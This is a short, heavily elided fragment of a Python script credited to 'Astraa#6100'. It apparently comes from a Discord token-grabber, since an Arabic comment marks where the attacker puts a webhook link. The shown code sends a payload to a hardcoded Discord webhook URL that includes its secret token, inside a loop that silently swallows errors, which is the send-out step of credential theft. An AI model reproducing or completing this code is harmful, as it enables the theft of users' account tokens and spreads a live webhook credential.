...
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                        ...
                        try:
                            ...
                            # رابط الويبهوك هنا 👇
                            req = Request('https://discord.com/api/webhooks/1539539546977599509/2-bbnCJY9jbiHKkp-3_ykBafkoWHFErlDamOsDiOyY6ZyVjrt0nkFRs4pfN4gSR5CCFk', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
